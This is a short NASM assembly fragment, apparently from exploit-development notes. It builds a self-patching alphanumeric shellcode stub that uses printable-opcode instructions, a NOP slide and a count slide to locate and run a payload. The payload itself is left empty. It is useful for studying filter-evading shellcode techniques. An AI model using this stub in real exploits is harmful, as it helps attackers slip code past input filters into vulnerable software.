BITS 32

; The address operands of instructions can be encoded in various ways.
; Unfortunately, NASM does not always use the alphanumeric variant. Which is why
; these are used:
%define IMUL___ESI__xESPx_(x)    db 0x6B, 0x34, 0x64, x
%define XOR____ESI__xESPx        db 0x33, 0x34, 0x64
%define XOR____xESPx__ESI        db 0x31, 0x34, 0x64

; ...nopslide goes here...
patcher:
  PUSH   0x40404040            ; [ESP0] = code1, ESP = ESP0
  IMUL___ESI__xESPx_(0x30)     ; ESI = code1 * code2
  PUSH   0x40404040            ; [ESP1] = code3, ESP = ESP1
  XOR____ESI__xESPx            ; ESI = (code1 * 30) ^ code2 = (A + D * 3 + P)
  PUSH   BYTE 0x41             ; [ESP2] = 0x41 (INC ECX), ESP = ESP2
  POP    EAX                   ; EAX = [ESP2] = 0x41, ESP = ESP1
  XOR    AL, 0x59              ; AL = AL ^ 59 = 41 ^ 59
  PUSH   EAX                   ; [ESP2] = (41^59) XX XX XX
  DEC    ESP                   ; ESP = ESP2 - 1, [ESP] = XX (41^59) XX XX
  POP    EDX                   ; DH = 41 ^ 59
  INC    ESP                   ; ESP = ESP2 (Do we care about fixing ESP?)
  XOR    [ESI], DH             ; [A + D * 3 + P] = 41 ^ (41 ^ 59) = 59 (POP ECX)
  INC    ESI                   ; ESI = (A + D * 3 + P + 1)
  PUSH   ESI                   ; [ESP3] = (A + D * 3 + P + 1)
; ...count slide goes here...
;   INC ECX
;   INC ECX
;   INC ECX
;   ...
; ...at address (A + D * 3 + P):
;   POP ECX                    ; ECX = A + D * 3 + P + 1
; ...count slide continues...
;   INC ECX                    ; ECX = A + D * 3 + P + 2
;   INC ECX                    ; ECX = A + D * 3 + P + 3
;   ...
;   INC ECX                    ; ECX = A + D * 3 + P + 1 + (D - O)
; ECX now points to the base address of shellcode:
shellcode:



